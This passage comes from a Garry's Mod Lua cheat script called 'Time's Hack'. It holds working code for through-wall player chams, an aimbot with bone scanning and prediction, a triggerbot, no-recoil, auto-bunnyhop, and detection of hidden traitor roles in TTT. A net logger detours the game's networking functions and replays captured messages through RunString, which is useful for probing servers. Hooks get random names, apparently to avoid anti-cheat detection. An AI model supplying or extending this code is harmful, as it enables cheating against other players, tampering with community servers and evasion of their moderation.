						draw.SimpleText("Spectator: "..v:Name(), "ESP_Font_Main", ScrW() - nameWidth - 2, 0 + (15 * #observingPlayers.watcher) + ( 15 * k ), Color(255, 0, 0), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
					end
				end
				if v.Traitor then
					surface.SetFont("ESP_Font_Flag")
					local w, h = surface.GetTextSize("Traitor")
					draw.SimpleTextOutlined("Traitor", "ESP_Font_Flag", MaxX+5, MinY + h, Color(255, 0, 0) , TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0))
				end
				if config["misc_ttt"] && engine.ActiveGamemode() == "murder" then
					if v:HasWeapon("weapon_mu_knife") then
						surface.SetFont("ESP_Font_Flag")
						local w, h = surface.GetTextSize("Murderer")
						draw.SimpleTextOutlined("Murderer", "ESP_Font_Flag", MaxX+5, MinY + h, Color(255, 0, 0) , TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0))	
					end 	
				end
			end
		end
	end
end)

-- ======================= Glow

hook.Add("PreDrawHalos", RandomString(), function()
	if config["esp_player_glow"] then
		halo.Add(playerTable, string.ToColor(config.colors["esp_player_glow"]), 1, 1, 2, true, true)
	end
end)

-- ======================= Chams

local texturedCham = CreateMaterial( "textured", "VertexLitGeneric", {
  ["$basetexture"] = "models/debug/debugwhite",
  ["$model"] = 1,
  ["$translucent"] = 1,
  ["$vertexalpha"] = 1,
  ["$vertexcolor"] = 1
})

local wireframeCham = CreateMaterial( "wireframe", "Wireframe", {
  ["$basetexture"] = "models/debug/debugwhite",
  ["$model"]       = 1,
  ["$translucent"] = 1,
  ["$alpha"]       = 1,
  ["$nocull"]      = 1,
})

hook.Add("RenderScreenspaceEffects", RandomString(), function()

	local colorFix = (1 / 255)
	local chamColVis = string.ToColor(config.colors["esp_player_chams"])
	local chamColInvis = string.ToColor(config.colors["esp_player_chams_xyz"])

	if config["esp_player_chams_xyz"] then

		if config["esp_player_chams_material"] == 1 then
			cam.Start3D( EyePos(), EyeAngles() )
				for k, v in pairs( player.GetAll() ) do
					if ValidateESP(v) then
						cam.IgnoreZ(true)
						render.SetColorModulation( chamColInvis.r * colorFix, chamColInvis.g * colorFix, chamColInvis.b * colorFix )
						render.SetBlend( chamColInvis.a * colorFix)
						render.MaterialOverride( texturedCham )
						v:SetRenderMode( 1 )
						if chamColInvis.a == 255 then
							v:SetColor(Color(255, 255, 255, 255))
						else
							v:SetColor(Color(255, 255, 255, 0))
						end
						v:DrawModel()
						cam.IgnoreZ(false)
						render.SetColorModulation( 1, 1, 1 )
						render.SetBlend( 1 )
						render.MaterialOverride()
						v:DrawModel()
					end
				end
			cam.End3D()
		elseif config["esp_player_chams_material"] == 2 then
			cam.Start3D( EyePos(), EyeAngles() )
				for k, v in pairs( player.GetAll() ) do
					if ValidateESP(v) then
						render.SetColorModulation( 1, 1, 1 )
						render.MaterialOverride()
						v:DrawModel()
						render.SuppressEngineLighting( true )
						cam.IgnoreZ(true)
						render.SetColorModulation( chamColInvis.r * colorFix, chamColInvis.g * colorFix, chamColInvis.b * colorFix )
						render.SetBlend( chamColInvis.a * colorFix )
						render.MaterialOverride( texturedCham )
						v:SetRenderMode( 1 )
						if chamColInvis.a == 255 then
							v:SetColor(Color(255, 255, 255, 255))
						else
							v:SetColor(Color(255, 255, 255, 0))
						end
						v:DrawModel()
						cam.IgnoreZ(false)
						render.SuppressEngineLighting( false )
						render.SetColorModulation( 1, 1, 1 )
						render.SetBlend( 1 )
						render.MaterialOverride()
						v:DrawModel()
					end
				end
			cam.End3D()
		elseif config["esp_player_chams_material"] == 3 then
			cam.Start3D( EyePos(), EyeAngles() )
				for k, v in pairs( player.GetAll() ) do
					if ValidateESP(v) then
						cam.IgnoreZ(true)
						render.SetColorModulation( chamColInvis.r * colorFix, chamColInvis.g * colorFix, chamColInvis.b * colorFix )
						render.SetBlend( chamColInvis.a * colorFix )
						render.MaterialOverride( wireframeCham )
						v:SetRenderMode( 1 )
						v:SetColor(Color(255, 255, 255, 0))
						v:DrawModel()
						cam.IgnoreZ(false)
					end
				end
			cam.End3D()
		end
	end

	if config["esp_player_chams"] then

		if config["esp_player_chams_material"] == 1 then
			cam.Start3D( EyePos(), EyeAngles() )
				for k, v in pairs( player.GetAll() ) do
					if ValidateESP(v) then
						render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
						render.SetBlend( chamColVis.a * colorFix)
						render.MaterialOverride( texturedCham )
						v:SetRenderMode( 1 )
						if chamColVis.a == 255 then
							v:SetColor(Color(255, 255, 255, 255))
						else
							v:SetColor(Color(255, 255, 255, 0))
						end
						v:DrawModel()
					end
				end
			cam.End3D()
		elseif config["esp_player_chams_material"] == 2 then
			cam.Start3D( EyePos(), EyeAngles() )
				for k, v in pairs( player.GetAll() ) do
					if ValidateESP(v) then
						render.SuppressEngineLighting( true )
						render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
						render.SetBlend( chamColVis.a * colorFix)
						render.MaterialOverride( texturedCham )
						v:SetRenderMode( 1 )
						if chamColVis.a == 255 then
							v:SetColor(Color(255, 255, 255, 255))
						else
							v:SetColor(Color(255, 255, 255, 0))
						end
						v:DrawModel()
						render.SuppressEngineLighting( false )
					end
				end
			cam.End3D()
		elseif config["esp_player_chams_material"] == 3 then
			cam.Start3D( EyePos(), EyeAngles() )
				for k, v in pairs( player.GetAll() ) do
					if ValidateESP(v) then
						render.SetColorModulation( chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix )
						render.SetBlend( chamColVis.a * colorFix)
						render.MaterialOverride( wireframeCham )
						v:SetRenderMode( 1 )
						v:SetColor(Color(255, 255, 255, 0))
						v:DrawModel()
					end
				end
			cam.End3D()
		end
	end
	if !config["esp_player_chams"] && !config["esp_player_chams_xyz"] then
		for k, v in pairs(player.GetAll()) do
			v:SetRenderMode(0)
		end
	end
end)

-- ======================= Fog

hook.Add("SetupWorldFog", RandomString(), function()

	if config["esp_other_fog"] then

		local col = string.ToColor(config.colors["esp_other_fog"])

		render.FogMode( MATERIAL_FOG_LINEAR )
		render.FogStart(config["esp_other_fog_start"])
		render.FogEnd(config["esp_other_fog_end"])
		render.FogMaxDensity(config["esp_other_fog_density"])
		render.FogColor(col.r, col.g, col.b)

		return true
	end
end)

hook.Add("SetupSkyboxFog", RandomString(), function( skyboxscale )

	if config["esp_other_fog"] then

		local col = string.ToColor(config.colors["esp_other_fog"])

		render.FogMode( MATERIAL_FOG_LINEAR )
		render.FogStart(config["esp_other_fog_start"] * skyboxscale)
		render.FogEnd(config["esp_other_fog_end"] * skyboxscale)
		render.FogMaxDensity(config["esp_other_fog_density"])
		render.FogColor(col.r, col.g, col.b)

		return true
	end
end)

-- ======================= Nightmode

hook.Add( "RenderScreenspaceEffects", "nightmode", function()

	if config["esp_other_nightmode"] then
		local nightmode = {
			[ "$pp_colour_addr" ] = 55 * (1 / 255),
			[ "$pp_colour_addg" ] = 45 * (1 / 255),
			[ "$pp_colour_addb" ] = 66 * (1 / 255),
			[ "$pp_colour_brightness" ] = -0.2,
			[ "$pp_colour_contrast" ] = config["esp_other_nightmode_scale"],
			[ "$pp_colour_colour" ] = 1,
			[ "$pp_colour_mulr" ] = 0,
			[ "$pp_colour_mulg" ] = 0,
			[ "$pp_colour_mulb" ] = 0
		}
		DrawColorModify( nightmode )
	end
end)	

--=================================== Hitsound

	
hook.Add("ScalePlayerDamage", "hitsound", function(ply, group, dmginfo)
	if config["esp_other_hitsound"] then
		if dmginfo:GetAttacker() == LocalPlayer() then
			surface.PlaySound("garrysmod/balloon_pop_cute.wav")
		end
	end
end)

--=================================== Fullbright


local LightingModeChanged = false
hook.Add("PreRender", RandomString(), function()
	if config["esp_other_fullbright"] then
		render.SetLightingMode( 1 )
		LightingModeChanged = true
	end
end )

function EndOfLightingMod()
	if LightingModeChanged then
		render.SetLightingMode( 0 )
		LightingModeChanged = false
	end
end
hook.Add("PostRender", RandomString(), EndOfLightingMod)
hook.Add("PreDrawHUD", RandomString(), EndOfLightingMod)


--=================================== Draw FOV

hook.Add("CheatHUDPaint", RandomString(), function()
	if config["aim_master_toggle"] && config["esp_other_drawfov"] && config["aim_fov"] < 90 then
		local X1 = math.tan( math.rad( config["aim_fov"] ) / 1.25 )
		local X2 = math.tan( math.rad( LocalPlayer():GetFOV() / 2 ) )
		local r = X1 / X2
		local pxR = r * ( ScrW() / 2 )
		surface.DrawCircle(ScrW() / 2, ScrH() / 2, pxR, string.ToColor(config.colors["esp_other_drawfov"]))
	end
end)

--=================================== Camera Modifications

local intp

hook.Add("CalcView", RandomString(), function(ply, pos, ang, fov)

	if config["esp_other_thirdperson"] then
		local Camera = {}
		if config.keybinds["thirdperson_key"] == 0 then 
			intp = true
		end
		if ( ( ( config.keybinds["thirdperson_key"] >= 107 && config.keybinds["thirdperson_key"] <= 113 ) && input.IsMouseDown(config.keybinds["thirdperson_key"] ) && !toggledelay ) || input.IsKeyDown(config.keybinds["thirdperson_key"]) && !toggledelay ) then
			if !intp then
				intp = true
				toggledelay = true
				timer.Simple(0.5, function() toggledelay = false end)
			else
				intp = false
				toggledelay = true
				timer.Simple(0.5, function() toggledelay = false end)
			end
		end
		if intp then
			Camera.origin = pos - ( ang:Forward() * (config["esp_other_thirdperson_distance"] * 10) ) 
			Camera.angles = ang
			Camera.fov = fov
			Camera.drawviewer = true
			return Camera
		end
		if config["aim_norecoil"] && !intp then
			Camera.angles = LocalPlayer():EyeAngles()
			return Camera 
		end
	else
		local Camera = {}
		if config["aim_norecoil"] && !intp then
			Camera.angles = LocalPlayer():EyeAngles()
			return Camera
		end
	end
end)

--===================================
--=================================== Aimbot
--===================================

--=================================== No Recoil
 
local OEyeAngles = OEyeAngles or FindMetaTable( "Player" ).SetEyeAngles

FindMetaTable( "Player" ).SetEyeAngles = function( self, angle )

    if ( string.find( string.lower( debug.getinfo( 2 ).short_src ), "/weapons/" ) ) and config["aim_norecoil"] then return end

    OEyeAngles( self, angle )

end

--=================================== Aimbot

local predictedWeapons = {
	["weapon_crossbow"] = 3110;
}

local pred

hook.Add("CreateMove", RandomString(), function(ucmd)
	if config["aim_master_toggle"] then
		if !config["aim_onkey"] || ( ( ( config.keybinds["aim_onkey_key"] >= 107 && config.keybinds["aim_onkey_key"] <= 113 ) && input.IsMouseDown(config.keybinds["aim_onkey_key"]) ) || input.IsKeyDown(config.keybinds["aim_onkey_key"]) ) && !frame then
			if !LocalPlayer():Alive() then return end
			if LocalPlayer():GetActiveWeapon():Clip1() != 0 then
			local centerx, centery = ScrW() / 2, ScrH() / 2
			local PlayerDistance, NewPlayerDistance, PlayerHealth, NewPlayerHealth, playerCenter, newPlayerCenter = math.huge, math.huge, math.huge, math.huge, math.huge, math.huge
				for k, v in pairs(player.GetAll()) do
					if ValidateAimbot(v) then
						if isVisible(v) then
							if config["aim_prediction"] then
								pred = ( v:GetVelocity() * frametime )
							else
								pred = Vector(0, 0, 0)
							end
							local LOS, AimP, InFOV = false, false, false
							local CurAngle = ucmd:GetViewAngles()
							local CurPos = LocalPlayer():GetShootPos()
							local AimSpot

							if config["aim_hitbox"] == 1 then

								AimSpot = HitScan(v)

							elseif config["aim_hitbox"] == 2 && v:LookupBone("ValveBiped.Bip01_Head1") != nil then

								AimSpot = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Head1")) + Vector(0, 0, 1) + pred

							elseif config["aim_hitbox"] == 3 && v:LookupBone("ValveBiped.Bip01_Pelvis") != nil then

								AimSpot = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Pelvis")) + pred

							else

								AimSpot = v:LocalToWorld(v:OBBCenter()) + pred

							end

							if IsValid(LocalPlayer():GetActiveWeapon()) && LocalPlayer():GetActiveWeapon():GetClass() == "weapon_crossbow" then
								AimSpot = Prediction(v, AimSpot)
							end

							local FinAngle = ( AimSpot - CurPos ):Angle()
							FinAngle:Normalize()

							if config["aim_target"] == 1 then
								if math.sqrt((AimSpot:ToScreen().x - centerx) * (AimSpot:ToScreen().x - centerx) + (AimSpot:ToScreen().y - centery) * (AimSpot:ToScreen().y - centery)) < playerCenter then newPlayerCenter = math.sqrt((AimSpot:ToScreen().x - centerx) * (AimSpot:ToScreen().x - centerx) + (AimSpot:ToScreen().y - centery) * (AimSpot:ToScreen().y - centery)) AimP = true end
							elseif config["aim_target"] == 2 then
								if v:Health() < PlayerHealth then NewPlayerHealth = v:Health() AimP = true end
							elseif config["aim_target"] == 3 then
								if LocalPlayer():GetPos():Distance(v:GetPos()) < PlayerDistance then NewPlayerDistance = LocalPlayer():GetPos():Distance(v:GetPos()) AimP = true end
							end
							local angDiff = GetAngleDiffrence(CurAngle, FinAngle)
							angDiff = math.abs(math.NormalizeAngle(angDiff))
							if angDiff < config["aim_fov"] then
								InFOV = true 
							end

							if AimP && InFOV then
								if config["aim_smoothing"] && ( IsValid(LocalPlayer():GetActiveWeapon()) && LocalPlayer():GetActiveWeapon():GetClass() != "weapon_crossbow" ) then
									playerCenter = newPlayerCenter
									PlayerHealth = NewPlayerHealth
									PlayerDistance = NewPlayerDistance
									ucmd:SetViewAngles(Smoothing(FinAngle))
								else
									playerCenter = newPlayerCenter
									PlayerHealth = NewPlayerHealth
									PlayerDistance = NewPlayerDistance
									ucmd:SetViewAngles(FinAngle)
								end
							end
						end
					end
				end
			end
		end
	end
end)

function GetAngleDiffrence(from, to)

	local ang, aim

	ang = from:Forward()
	aim = to:Forward()

	return math.deg( math.acos( aim:Dot(ang) / aim:LengthSqr() ) )

end

function HitScan(v)
	local bones = {}
	local centerx, centery = ScrW() / 2, ScrH() / 2
	local BPHead, BPUpperChest, BPChest, BPLowerChest, BPPelvis, HeadDis, UpperChestDis, ChestDis, LowerChestDis, PelvisDis

	if v:LookupBone("ValveBiped.Bip01_Head1") != nil then
		BPHead = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Head1"))
		HeadDis = math.sqrt((centerx - BPHead:ToScreen().x) * (centerx - BPHead:ToScreen().x) + (centery - BPHead:ToScreen().y) * (centery - BPHead:ToScreen().y))
		table.insert(bones, HeadDis)
	end
	if v:LookupBone("ValveBiped.Bip01_Spine4") != nil then
		BPUpperChest = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Spine4"))
		UpperChestDis = math.sqrt((centerx - BPUpperChest:ToScreen().x) * (centerx - BPUpperChest:ToScreen().x) + (centery - BPUpperChest:ToScreen().y) * (centery - BPUpperChest:ToScreen().y))
		table.insert(bones, UpperChestDis)
	end
	if v:LookupBone("ValveBiped.Bip01_Spine2") != nil then
		BPChest = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Spine2"))
		ChestDis = math.sqrt((centerx - BPChest:ToScreen().x) * (centerx - BPChest:ToScreen().x) + (centery - BPChest:ToScreen().y) * (centery - BPChest:ToScreen().y))
		table.insert(bones, ChestDis)
	end
	if v:LookupBone("ValveBiped.Bip01_Spine1") != nil then
		BPLowerChest = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Spine1"))
		LowerChestDis = math.sqrt((centerx - BPLowerChest:ToScreen().x) * (centerx - BPLowerChest:ToScreen().x) + (centery - BPLowerChest:ToScreen().y) * (centery - BPLowerChest:ToScreen().y))
		table.insert(bones, LowerChestDis)
	end
	if v:LookupBone("ValveBiped.Bip01_Pelvis") != nil then
		BPPelvis = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Pelvis"))
		PelvisDis = math.sqrt((centerx - BPPelvis:ToScreen().x) * (centerx - BPPelvis:ToScreen().x) + (centery - BPPelvis:ToScreen().y) * (centery - BPPelvis:ToScreen().y))
		table.insert(bones, PelvisDis)
	end

	if table.IsEmpty(bones) then return v:LocalToWorld(v:OBBCenter()) + pred end

	local ClosestBone = math.min(unpack(bones))
	if ClosestBone == HeadDis then
		AimSpot = BPHead + Vector(0, 0, 1) + pred
		AimBone = "Head"
	elseif ClosestBone == UpperChestDis then
		AimSpot = BPUpperChest + pred
		AimBone = "Upper Chest"
	elseif ClosestBone == ChestDis then
		AimSpot = BPChest + pred
		AimBone = "Chest"
	elseif ClosestBone == LowerChestDis then
		AimSpot = BPLowerChest + pred
		AimBone = "Lower Chest"
	elseif ClosestBone == PelvisDis then
		AimSpot = BPPelvis + pred
		AimBone = "Pelvis"
	else
		AimSpot = v:LocalToWorld(v:OBBCenter()) + pred
		local errorDelay = false
		if !errorDelay then
			chat.AddText(Color(61, 149, 217), "[Time's Hack] ", Color(255, 0, 0), "|WARNING|", Color(222, 222, 222), "Hitscan Failed Please Report This To The Developer.")
			errorDelay = true
			timer.Simple(5, function() errorDelay = false end)
		end
	end	
	return AimSpot
end

function Prediction(v, pos)
	local ply = LocalPlayer()
	if ( type( v:GetVelocity() ) == "Vector" ) then
		local dis, wep = v:GetPos():Distance( ply:GetPos() ), ( ply.GetActiveWeapon && IsValid( ply:GetActiveWeapon() ) && ply:GetActiveWeapon():GetClass() )
		if ( wep && predictedWeapons[ wep ]  ) then
			local t = dis / predictedWeapons[ wep ]
			return ( pos + v:GetVelocity() * t )
		end
		return pos
	end
	return pos
end

function isVisible( v )
	local ply = LocalPlayer()
	
	local pos = v:LocalToWorld(v:OBBCenter())
	
	local trace = { 
		start = ply:GetShootPos(), 
		endpos = pos, 
		filter = { ply, v }, 
		mask = MASK_SHOT
	}
	local tr = util.TraceLine( trace )
	
	if( !tr.Hit ) then
		return true
	end
	return false
end

function Smoothing( ang )
	if ( config["aim_smoothing_value"] == 0 ) then return ang end
	local speed, ply = RealFrameTime() / ( config["aim_smoothing_value"] / 10 ), LocalPlayer()
	local angl = LerpAngle( speed, ply:EyeAngles(), ang )
	return Angle( angl.p, angl.y, 0 )
end

--=================================== Trigger

hook.Add("CreateMove", RandomString(), function( ucmd )
	if config["trigger_master_toggle"] then
		if !config["trigger_onkey"] || ( ( ( config.keybinds["trigger_onkey_key"] >= 107 && config.keybinds["trigger_onkey_key"] <= 113 ) && input.IsMouseDown(config.keybinds["trigger_onkey_key"]) ) || input.IsKeyDown(config.keybinds["trigger_onkey_key"]) ) && !frame then
			if IsValid(LocalPlayer()) && LocalPlayer():Alive() then
				if LocalPlayer():GetActiveWeapon():GetClass() != "weapon_physgun" then
					local tr = LocalPlayer():GetEyeTraceNoCursor()
					if tr.Entity:IsPlayer() then
						ply = tr.Entity
						if ValidateAimbot(ply) then
							if ucmd:KeyDown( IN_ATTACK2 ) && ucmd:KeyDown( IN_DUCK ) then 
								ucmd:SetButtons( IN_DUCK + IN_ATTACK2 + IN_ATTACK )
								timer.Simple( 0.05, function() RunConsoleCommand( "-attack" ) end ) 
							elseif ucmd:KeyDown( IN_DUCK ) then 
								ucmd:SetButtons( IN_DUCK + IN_ATTACK )
								timer.Simple( 0.05, function() RunConsoleCommand( "-attack" ) end )
							elseif ucmd:KeyDown( IN_ATTACK2 ) then 
								ucmd:SetButtons( IN_ATTACK2 + IN_ATTACK )
								timer.Simple( 0.05, function() RunConsoleCommand( "-attack" ) end ) 
							else
								ucmd:SetButtons( IN_ATTACK ) 
								timer.Simple( 0.05, function() RunConsoleCommand( "-attack" ) end )
							end
						end
					end
				end
			end
		end
	end
end)

--===================================
--=================================== Misc
--===================================

--=================================== Auto Strafe + Bhop

strafe = { }
strafe.MetaPlayer = FindMetaTable( "Player") 
strafe.oldKeyDown = strafe.MetaPlayer['KeyDown']
strafe.On = true
strafe.MetaPlayer['KeyDown'] = function( self, key )
	if self ~= LocalPlayer() then return end

	if (key == IN_MOVELEFT) and strafe.left then
		return true
	elseif (key == IN_MOVERIGHT) and strafe.right then
		return true
	else
		return strafe.oldKeyDown( self, key )
	end
end

local oldEyePos = LocalPlayer():EyeAngles()

function Autostrafe( cmd )
	if !( LocalPlayer():GetMoveType() == MOVETYPE_LADDER || LocalPlayer():GetMoveType() == MOVETYPE_NOCLIP ) then 
		if (cmd:KeyDown( IN_JUMP )) then
			if (strafe.On ) then

				local traceRes = LocalPlayer():EyeAngles()
									   
				if ( traceRes.y > oldEyePos.y ) then
					oldEyePos = traceRes
					cmd:SetSideMove( -1000000 )
					strafe.left = true
					strafe.right = false 
				elseif  ( oldEyePos.y > traceRes.y )  then
					oldEyePos = traceRes
					cmd:SetSideMove( 1000000 )
					strafe.right = true
					strafe.left = false
				end
			end
		end	
	end 
end

hook.Add("CreateMove", RandomString(), function( ucmd )
	if config["misc_autostrafe"] then
		Autostrafe( ucmd )
	end
	if config["misc_autobunnyhop"] then
		local ply = LocalPlayer()
		if ( ply:GetMoveType() == MOVETYPE_LADDER || ply:GetMoveType() == MOVETYPE_NOCLIP ) then return end
		if ( ucmd:KeyDown( IN_JUMP ) ) then
			if ( !ply:OnGround() ) then
				ucmd:SetButtons( ucmd:GetButtons() - IN_JUMP )
			end
		end
	end
end)

--=================================== TTT

--local twep = { "weapon_ttt_c4", "weapon_ttt_knife", "weapon_ttt_phammer", "weapon_ttt_sipistol", "weapon_ttt_flaregun", "weapon_ttt_push", "weapon_ttt_radio", "weapon_ttt_teleport", "(Disguise)" ,"spiderman's_swep", "weapon_ttt_trait_defilibrator", "weapon_ttt_xbow", "weapon_ttt_dhook", "weapon_awp", "weapon_jihadbomb", "weapon_ttt_knife", "weapon_ttt_c4", "weapon_ttt_decoy", "weapon_ttt_flaregun", "weapon_ttt_phammer", "weapon_ttt_push", "weapon_ttt_radio", "weapon_ttt_sipistol", "weapon_ttt_teleport", "weapon_ttt_awp", "weapon_ttt_silencedsniper", "weapon_ttt_turtlenade", "weapon_ttt_death_station", "weapon_ttt_tripmine"}
local twep = {}

for _,v in ipairs(player.GetAll()) do
    v.Traitor = nil
end
for _,v in ipairs(ents.GetAll()) do
    v.WepTracked = nil
end

hook.Add("TTTBeginRound", RandomString(), function()
	table.Empty(twep)
	for _, wep in pairs(weapons.GetList()) do
    	if wep and wep.CanBuy != nil then
      		for _, role in pairs(wep.CanBuy) do
        		if role == ROLE_TRAITOR then
          			if !table.HasValue(twep, wep.ClassName) then 
          				table.insert(twep, wep.ClassName)
          			end
        		end 
      		end
      	end
    end
end)

hook.Add("Think", RandomString(), function()
	if config["misc_ttt"] && engine.ActiveGamemode() == "terrortown" then
		if table.IsEmpty(twep) then
			twep = { "weapon_ttt_c4", "weapon_ttt_knife", "weapon_ttt_phammer", "weapon_ttt_sipistol", "weapon_ttt_flaregun", "weapon_ttt_push", "weapon_ttt_radio", "weapon_ttt_teleport", "(Disguise)" ,"spiderman's_swep", "weapon_ttt_trait_defilibrator", "weapon_ttt_xbow", "weapon_ttt_dhook", "weapon_awp", "weapon_jihadbomb", "weapon_ttt_knife", "weapon_ttt_c4", "weapon_ttt_decoy", "weapon_ttt_flaregun", "weapon_ttt_phammer", "weapon_ttt_push", "weapon_ttt_radio", "weapon_ttt_sipistol", "weapon_ttt_teleport", "weapon_ttt_awp", "weapon_ttt_silencedsniper", "weapon_ttt_turtlenade", "weapon_ttt_death_station", "weapon_ttt_tripmine"}
		end
	    if GAMEMODE.round_state != ROUND_ACTIVE then
	        for _,v in ipairs(player.GetAll()) do
	                v.Traitor = nil
	        end
	        for _,v in ipairs(ents.GetAll()) do
	                v.WepTracked = nil
	        end
	        return
	    end
	    for _,v in ipairs( ents.GetAll() ) do
	        if v and IsValid(v) and (table.HasValue(twep, v:GetClass()) and !v.WepTracked) then
	            local pl = v.Owner
	            if pl and IsValid(pl) and pl:IsTerror() then
	                if pl:IsDetective() then
	                    v.WepTracked = true
	                else
	                    v.WepTracked = true
	                    pl.Traitor = true
	                    chat.AddText(Color(61, 149, 217), "[Time's Hack] ", Color(222, 222, 222), pl,  " is a ", Color(255,0,0), "TRAITOR", Color(222, 222, 222), " with a ", Color(255, 0, 0), v:GetClass() .. "!")
	                end
	            end
	        end
	    end
	end
end)

--=================================== Rainbow Physgun

hook.Add("Think", RandomString(), function()
	if config["misc_rainbow"] then
		local col = HSVToColor( ( CurTime() * config["misc_rainbow_speed"] ) % 360, 1, 1 )
		if LocalPlayer():Alive() && IsValid(LocalPlayer():GetActiveWeapon()) then
			if LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" then
				LocalPlayer():SetWeaponColor( Color(col.r, col.g, col.b):ToVector() )
			end
		end
	end
end)

--=================================== Auto Click

hook.Add("CreateMove", RandomString(), function( cmd )
	if config["misc_autoclick"] then
		if LocalPlayer():Alive() && IsValid(LocalPlayer():GetActiveWeapon()) then
			if LocalPlayer():GetActiveWeapon():GetClass() != "weapon_physgun" then
				if LocalPlayer():KeyDown( IN_ATTACK ) then cmd:RemoveKey(IN_ATTACK) end
			end
		end
	end
end)

--===================================
--=================================== Net Logger
--===================================

local netCodes = netCodes or {
	["SendToServer"] = net.SendToServer,
	["Start"] = net.Start,
	["WriteAngle"] = net.WriteAngle,
	["WriteBit"] = net.WriteBit,
	["WriteBool"] = net.WriteBool,
	["WriteColor"] = net.WriteColor,
	["WriteData"] = net.WriteData,
	["WriteDouble"] = net.WriteDouble,
	["WriteEntity"] = net.WriteEntity,
	["WriteFloat"] = net.WriteFloat,
	["WriteInt"] = net.WriteInt,
	["WriteMatrix"] = net.WriteMatrix,
	["WriteNormal"] = net.WriteNormal,
	["WriteString"] = net.WriteString,
	["WriteTable"] = net.WriteTable,
	["WriteUInt"] = net.WriteUInt,
	["WriteVector"] = net.WriteVector
}

function tableToString(t)
   if type(o) == 'table' then
      local s = '{ '
      for k,v in pairs(o) do
         if type(k) ~= 'number' then k = '"'..k..'"' end
         s = s .. '['..k..'] = ' .. dump(v) .. ','
      end
      return s .. '} '
   else
      return tostring(o)
   end
end

local buffer = ""

local function construct_net_block(t, netName)
	makeString = "net." ..netName .. "("
	for i=1, #t do
		indexValue = t[i]
		if (type(indexValue) == "number") then
			if (i == #t) then makeString = makeString .. indexValue  else makeString = makeString .. indexValue .. ", " end
		elseif (type(indexValue) == "boolean") then
			makeString = makeString .. tostring(indexValue)
		elseif (type(indexValue) == "string") then
			if (i == #t) then makeString = makeString .. "\"" .. indexValue .. "\"" else makeString = makeString .. "\"" .. indexValue .. "\", " end
		elseif (type(indexValue) == "Player" || type(indexValue) == "Entity" || type(indexValue) == "NPC") then
			makeString = makeString .. "Entity(" .. tostring(indexValue:EntIndex()) .. ")"
		elseif (type(indexValue) == "Vector") then
			makeString = makeString .. "Vector(" .. string.gsub(tostring(indexValue), "%s+", ", ") .. ")"
		elseif (type(indexValue) == "table") then
			makeString = makeString .. table.ToString(indexValue)
		else
			--ErrorNoHalt("[Net Logger] !!! UNHANDLED !!! " .. "type(index): " .. "[" .. type(indexValue) .. "]" .. " index: " ..  "[" .. tostring(indexValue) .. "]")
		end
	end
	
	buffer = buffer .. makeString .. ")" .. "\n"
	if (string.match(buffer, "SendToServer")) then
		hook.Run( "RecvNetMsg", buffer )
		buffer = ""
	end
end

function handle_net_message(netName)
	return function (...) -- just doing this so I can give access to netName in construct_net_block function
		construct_net_block({...}, netName)
		hook.Add( "RecvNetMsg", "netlogger", function(netmsg)
			detour_net_functions(false)
			RunString(netmsg)
			detour_net_functions(true)
		end)
			
		-- netCodes[netName](...)
	end
end


function detour_net_functions(bool) -- WriteTable calls a bunch of other net functions internally, so got to turn it off
	if (bool) then
		for k, v in pairs(netCodes) do
			net[k] = handle_net_message(k)
		end
	else
		for k, v in pairs(netCodes) do
			net[k] = v
		end
	end
		
end


if (!detoured_net_functions) then
	detoured_net_functions = true
	detour_net_functions(true)
end

function mysplit(inputstr, sep)
        if sep == nil then
                sep = "%s"
        end
        local t={} ; i=1
        for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
                t[i] = str
                i = i + 1
        end
        return t
end

local net_message_box = {
	setTextAndCount = function(self, text, count)
		newLineCount = #mysplit(text, "\n")
		self:SetTitle(" #" .. tostring(count))
		self.netmsgBox:SetText(text)
		W, H = self.netmsgBox:GetSize()
		self:SetSize(W, H + 125)
		self:SizeToContents()
	end,
	Init = function(self)
		outer_self = self
		self:ShowCloseButton( false )
		self:SetSize(150, 400)
		self.W, self.H = self:GetSize()
		self.netmsgBox = vgui.Create( "DTextEntry", self)
		self.netmsgBox:SetPos( 40, 50 )
		self.netmsgBox:Dock(FILL)
		self.netmsgBox:SetEditable(false)
		self.netmsgBox:SetMultiline(true)
		self.netmsgBox.Paint = function(self,w,h)
			self:DrawTextEntryText(Color(255, 255, 255), Color(30, 130, 255), Color(255, 255, 255))
		end

	end,
	Think = function(self, w, h)
		if (self:IsHovered()) then

		end
	end
}

vgui.Register("netmessagebox", net_message_box, "DFrame")

local net_message_table = {}
local PANEL = {
	addToCatergory = function(self, netmsg, freq)
		local name = mysplit(netmsg, "\n")[1]
		if !net_message_table[name] then
			local Category = self.CategoryList:Add(name)
			Category:SetExpanded(false)

			local countLabel = vgui.Create( "DLabel", Category )
			countLabel:SetFont("netFont")
			countLabel:SetColor(Color(255,255,255))
			countLabel:SetPos( 280, 0 )
			countLabel:SetSize(200,16)
			countLabel:SetText("COUNT: 1")

			net_message_box = vgui.Create("netmessagebox")
			net_message_box:Dock( TOP )
			net_message_box:setTextAndCount(netmsg, 1)


			DScrollPanel = vgui.Create( "DScrollPanel")
			Category:SetContents(DScrollPanel)

			DScrollPanel:Add(net_message_box)
			DScrollPanel:Dock( FILL )

			net_message_table[name] = {panel = Category, count = 1, countLabel = countLabel, DScrollPanel = DScrollPanel}
		else
			count = net_message_table[name].count + 1
			countLabel = net_message_table[name]["countLabel"]
			panel = net_message_table[name]["panel"]
			DScrollPanel = net_message_table[name]["DScrollPanel"]

			net_message_table[name] = { panel = panel, count = count, countLabel = countLabel, DScrollPanel = DScrollPanel}

			panel:SetLabel(name)

			countLabel:SetFont("netFont")
			countLabel:SetColor(Color(255,255,255))
